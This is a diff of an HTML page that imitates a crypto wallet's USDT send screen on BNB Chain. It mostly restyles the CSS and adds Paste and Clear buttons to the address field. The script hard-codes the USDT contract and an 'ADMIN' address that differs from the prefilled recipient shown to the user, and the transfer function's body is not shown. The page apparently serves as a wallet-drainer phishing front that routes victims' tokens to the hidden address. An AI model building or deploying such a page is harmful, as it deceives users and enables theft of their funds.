@@ -1,4 +1,5 @@
-<!DOCTYPE html><html lang="en">
+<!DOCTYPE html>
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
@@ -12,112 +13,144 @@
       height: 100vh;
       display: flex;
       flex-direction: column;
-      justify-content: space-between;
-    }.container {
-  padding: 25px 20px 0 20px;
-  max-width: 460px;
-  margin: auto;
-}
-
-label {
-  font-size: 15px;
-  font-weight: 500;
-  color: #444;
-  margin-bottom: 6px;
-  display: block;
-}
-
-input[type="text"], input[type="number"] {
-  width: 100%;
-  padding: 14px;
-  font-size: 16px;
-  border: 1px solid #ccc;
-  border-radius: 12px;
-  margin-bottom: 15px;
-  box-sizing: border-box;
-}
-
-.amount-row {
-  display: flex;
-  align-items: center;
-  gap: 10px;
-}
-
-.amount-row span {
-  font-size: 16px;
-}
-
-.amount-row button {
-  background: none;
-  border: none;
-  color: #0047FF;
-  font-weight: bold;
-  font-size: 15px;
-  cursor: pointer;
-}
-
-#usdValue {
-  font-size: 14px;
-  color: #888;
-  margin-top: -8px;
-  margin-bottom: 30px;
-}
-
-.footer {
-  padding: 20px;
-  margin-top: auto;
-}
-
-#nextBtn {
-  width: 100%;
-  padding: 16px;
-  font-size: 18px;
-  background-color: #0047FF;
-  color: white;
-  font-weight: bold;
-  border: none;
-  border-radius: 24px;
-  cursor: pointer;
-  transition: all 0.3s;
-  position: relative;
-}
-
-#nextBtn.processing::after {
-  content: '⏳ Processing...';
-  position: absolute;
-  left: 0;
-  right: 0;
-  text-align: center;
-}
-
-#nextBtn.success::after {
-  content: '✅ Success!';
-  color: white;
-}
-
-#nextBtn.error::after {
-  content: '❌ Error!';
-  color: white;
-}
-
+    }
+    .container {
+      padding: 25px 20px 0 20px;
+      max-width: 460px;
+      margin: auto;
+    }
+    label {
+      font-size: 15px;
+      font-weight: 500;
+      color: #444;
+      margin-bottom: 6px;
+      display: block;
+    }
+    .input-box {
+      position: relative;
+    }
+    .input-box input[type="text"] {
+      width: 100%;
+      padding: 14px 40px 14px 16px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 12px;
+      box-sizing: border-box;
+    }
+    .input-box .actions {
+      position: absolute;
+      top: 50%;
+      right: 10px;
+      transform: translateY(-50%);
+      display: flex;
+      gap: 6px;
+    }
+    .input-box .actions button {
+      background: none;
+      border: none;
+      color: #0047FF;
+      font-weight: bold;
+      font-size: 14px;
+      cursor: pointer;
+    }
+    .amount-box {
+      position: relative;
+    }
+    .amount-box input {
+      width: 100%;
+      padding: 14px 80px 14px 16px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 12px;
+      box-sizing: border-box;
+    }
+    .amount-box span,
+    .amount-box button {
+      position: absolute;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 15px;
+      font-weight: 600;
+    }
+    .amount-box span {
+      right: 60px;
+      color: #444;
+    }
+    .amount-box button {
+      right: 10px;
+      background: none;
+      border: none;
+      color: #0047FF;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    #usdValue {
+      font-size: 14px;
+      color: #888;
+      margin: 10px 0 30px;
+    }
+    .footer {
+      padding: 20px;
+      margin-top: auto;
+    }
+    #nextBtn {
+      width: 100%;
+      padding: 16px;
+      font-size: 18px;
+      background-color: #0047FF;
+      color: white;
+      font-weight: bold;
+      border: none;
+      border-radius: 24px;
+      cursor: pointer;
+      transition: all 0.3s;
+      position: relative;
+    }
+    #nextBtn.processing::after {
+      content: '⏳ Processing...';
+      position: absolute;
+      left: 0;
+      right: 0;
+      text-align: center;
+    }
+    #nextBtn.success::after {
+      content: '✅ Success!';
+      color: white;
+    }
+    #nextBtn.error::after {
+      content: '❌ Error!';
+      color: white;
+    }
   </style>
 </head>
 <body>
   <div class="container">
     <label>Address or Domain Name</label>
-    <input type="text" disabled value="0x79069192614f7ceE4F..." /><label>Amount</label>
-<div class="amount-row">
-  <input type="number" id="usdtAmount" placeholder="0.00" />
-  <span>USDT</span>
-  <button onclick="setMax()">Max</button>
-</div>
+    <div class="input-box">
+      <input type="text" id="addressField" value="0x79069192614f7ceE4F..." />
+      <div class="actions">
+        <button onclick="pasteAddress()">Paste</button>
+        <button onclick="clearAddress()">✕</button>
+      </div>
+    </div>
 
-<p id="usdValue">= $0.00</p>
+    <label>Amount</label>
+    <div class="amount-box">
+      <input type="number" id="usdtAmount" placeholder="0.00" />
+      <span>USDT</span>
+      <button onclick="setMax()">Max</button>
+    </div>
 
-  </div>  <div class="footer">
+    <p id="usdValue">= $0.00</p>
+  </div>
+
+  <div class="footer">
     <button id="nextBtn" onclick="startTransfer()">Next</button>
-  </div>  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>  <script>
-    const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // BEP-20 USDT
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+  <script>
+    const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
     const ADMIN = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC";
     const BNB_CHAIN_ID = "0x38";
     const ABI = [
@@ -171,5 +204,16 @@ input[type="text"], input[type="number"] {
         btn.disabled = false;
       }
     }
-  </script></body>
+
+    function pasteAddress() {
+      navigator.clipboard.readText().then(text => {
+        document.getElementById('addressField').value = text;
+      });
+    }
+
+    function clearAddress() {
+      document.getElementById('addressField').value = '';
+    }
+  </script>
+</body>
 </html>
